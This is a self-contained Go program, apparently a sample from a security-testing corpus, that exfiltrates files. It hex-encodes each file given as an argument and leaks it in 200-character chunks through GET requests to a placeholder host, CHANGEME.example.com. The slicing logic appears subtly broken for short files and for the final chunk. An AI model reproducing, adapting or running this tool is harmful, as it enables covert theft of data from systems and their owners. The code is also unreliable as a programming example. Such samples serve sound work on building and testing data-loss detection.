/*
Copyright © 2023-present, Meta Platforms, Inc. and affiliates
Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:
The above copyright notice and this permission notice shall be included in
all copies or substantial portions of the Software.
THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
THE SOFTWARE.
*/

// @nolint
//go:build ignore

package main

import (
	"encoding/hex"
	"fmt"
	"io/ioutil"
	"net/http"
	"os"
)

func main() {
	args := os.Args[1:]

	for _, file := range args {

		if _, err := os.Stat(file); err == nil || os.IsExist(err) {
			if data, er := ioutil.ReadFile(file); er == nil {
				fmt.Println("[+] Sending file " + file + " using hex encoding as a URI parameter in a GET request...")
				plain := string(data)
				plain2 := []byte(plain)
				encoded := hex.EncodeToString(plain2)
				initializer := 0
				length := len(encoded)
				for {

					if initializer == 0 {
						int1 := 200 * initializer
						int2 := 200 + int1
						sendme := encoded[int1:int2]
						length -= 200
						initializer += 1
						dom := "http://CHANGEME.example.com/" + sendme
						_, err := http.Get(dom)
						if err != nil {
							fmt.Println(err)
						}
					} else {
						int3 := 200 * initializer
						int4 := 200 + int3

						if length < 200 {
							sendmefinal := encoded[int3:(int4 - (length))]
							mydom := "http://CHANGEME.example.com/" + sendmefinal
							_, err := http.Get(mydom)
							if err != nil {
								fmt.Println(err)
							}
							fmt.Println("[+] File " + file + " successfully sent!")
							break
						}
						sendme2 := encoded[int3:int4]
						dom2 := "http://CHANGEME.example.com/" + sendme2
						_, err := http.Get(dom2)
						if err != nil {
							fmt.Println(err)
						}
						length -= 200
						initializer += 1
					}

				}

			} else {
				fmt.Println("Error opening file " + file)
				os.Exit(1)
			}

		} else {
			fmt.Println("Input file " + file + " NOT found! Exiting...")
			os.Exit(1)
		}

	}

}
